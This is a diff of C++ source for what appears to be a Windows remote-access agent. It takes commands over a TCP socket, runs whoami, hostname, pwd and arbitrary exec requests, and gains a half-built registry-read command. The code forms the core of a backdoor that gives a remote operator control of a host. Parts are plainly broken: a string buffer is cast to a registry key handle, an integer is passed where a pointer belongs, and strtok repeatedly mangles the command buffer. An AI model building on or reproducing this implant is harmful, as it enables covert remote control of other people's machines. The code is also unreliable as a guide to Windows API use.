@@ -1,10 +1,16 @@
+//Win Macros
+#define WIN32_LEAN_AND_MEAN
+#define NOMINMAX
+
 //Win Headers
 #include <winsock2.h>
 #include <windows.h>
 #include <ws2tcpip.h>
+#include <shellapi.h>
 
 //C Headers
 #include <stdio.h>
+#include <stdlib.h>
 
 #define DEBUG 1
 
@@ -19,10 +25,10 @@
 //Global variables
 #define DEFAULT_BUFLEN 5120
 #define RESP_BUFLEN 258
-#define REGFUN_LEN 16
 #define REGKEY_LEN 256
 #define REGSUBKEY_LEN 16384
 #define REGVAL_LEN 1025
+#define REGTYPE_LEN 32
 #define REG_BUFLEN 
 
 
@@ -35,10 +41,10 @@ void whoami(char* returnval, int returnsize);
 void hostname(char* returnval, int returnsize);
 void pwd(char* returnval, int returnsize);
 void exec(char* returnval, int returnsize, char* args);
-void regedit(char* returnval, int returnsize, char* args);
+void regedit(char* returnval, int returnsize, char* cmd);
 
 bool IfCommand(char* cmd, char* toCompare);
-void ParseRegArgs(char* cmd);
+void ParseRegArgsRead(char* cmd, char* hKey, char* lpSubKey, char* lpValue, char* lpType);
 
 
 int main() {
@@ -157,12 +163,14 @@ void ParseCmd(char* cmd, SOCKET tcpsock) {
         strcat(buffer, "\n");
         send(tcpsock, buffer, strlen(buffer) + 1, 0);
     }
-    else if (IfCommand(cmd, "regedit")){                    //regedit
-#ifdef DEBUG
-        std::cout << "Command parsed: regedit\n";
-#endif
-        //TODO
-    }
+//     else if (IfCommand(cmd, "regedit")){                    //regedit
+// #ifdef DEBUG
+//         std::cout << "Command parsed: regedit\n";
+// #endif
+
+//         char buffer[DEFAULT_BUFLEN] = "";
+//         regedit(buffer, DEFAULT_BUFLEN, cmd);
+//     }
     else {                                                  //invalid
 #ifdef DEBUG
         std::cout << "Command not parsed!\n";
@@ -199,67 +207,53 @@ void exec(char* returnval, int returnsize, char* args) {
         strcat(returnval, "Executed");
     }
 }
+//regedit not working for now
+void regedit(char* returnval, int returnsize, char* cmd) {
+    if (IfCommand(cmd + 8, "read")) {
+        char hKey[REGKEY_LEN] = "";
+        char lpSubKey[REGSUBKEY_LEN] = "";
+        char lpValue[REGVAL_LEN] = "";
+        char lpType[REGTYPE_LEN] = "";
+        HKEY key;
 
-void regedit(char* returnval, int returnsize, char* args) {
-    //TODO
+        ParseRegArgsRead(cmd, hKey, lpSubKey, lpValue, lpType);
+        if (RegOpenKeyEx((HKEY)hKey, (LPCSTR)lpSubKey, 0, KEY_READ, &key) == 0) {
+            if (RegQueryValueEx(key, (LPCSTR)lpValue, 0, (LPDWORD)lpType, (LPBYTE)returnval, (LPDWORD)returnsize) == 0) {
+                std::cout << returnval << "\n";
+            }
+        }
+
+    }
+    else if (IfCommand(cmd + 8, "write")) {
+
+    }
+    else {
+
+    }
 }
 
 bool IfCommand(char* cmd, char* toCompare) {
-    char split_val[DEFAULT_BUFLEN] = ""; 
-    for (int i = 0; i < DEFAULT_BUFLEN; ++i) {
-        if (cmd[i] == ' ') {
-            break;
-        }
-        else {
-            split_val[i] = cmd[i];
-        }
-    }
-
+    char* split_val;
+    split_val = strtok(cmd, " ");
     return (strcmp(split_val, toCompare) == 0);
 }
 
-void ParseRegArgs(char* cmd) {
-    //In development
-    char function[REGFUN_LEN] = "";
-    int j = 0;
-    int i = 8;
-    for (i; i < REGFUN_LEN; ++i) {
-        if (cmd[i] == ' ') {
-            i++;
-            break;
-        }
-        else {
-            function[j] = cmd[i];
-            j++;
-        }
-    }
+void ParseRegArgsRead(char* cmd, char* hKey, char* lpSubKey, char* lpValue, char* lpType) {
+    char *tmp;
 
-    char hkey[REGKEY_LEN] = "";
-    j = 0;
-    for (i; i < REGFUN_LEN + REGKEY_LEN; ++i) {
-        if (cmd[i] == ' ') {
-            i++;
-            break;
-        }
-        else {
-            hkey[j] = cmd[i];
-            j++;
-        }
-    }
+    tmp = strtok(cmd + 13, " ");
+    strncpy(hKey, tmp, REGKEY_LEN);
+    tmp = strtok(NULL, " ");
+    strncpy(lpSubKey, tmp, REGSUBKEY_LEN);
+    tmp = strtok(NULL, " ");
+    strncpy(lpValue, tmp, REGVAL_LEN);
+    tmp = strtok(NULL, " ");
+    strncpy(lpType, tmp, REGTYPE_LEN);
 
-    char lpSubKey[REGSUBKEY_LEN] = "";
-    j = 0;
-    for (i; i < REGFUN_LEN + REGKEY_LEN + REGSUBKEY_LEN; ++i) {
-        if (cmd[i] == ' ') {
-            i++;
-            break;
-        }
-        else {
-            lpSubKey[j] = cmd[i];
-            j++;
-        }
+    if (strcmp(lpValue, "NULL") == 0) {
+        strncpy(lpValue, "", REGVAL_LEN);
     }
-
-    char lpValue[REGVAL_LEN] = "";
-    strncpy(lpValue, cmd + 8 + 3 + strlen(function) + strlen(hkey) + strlen(lpSubKey), strlen(cmd));
+#ifdef DEBUG
+    std::cout << "ParseArgsRead: " << hKey << "\t" << lpSubKey << "\t" << lpValue << "\n";
+#endif
 }
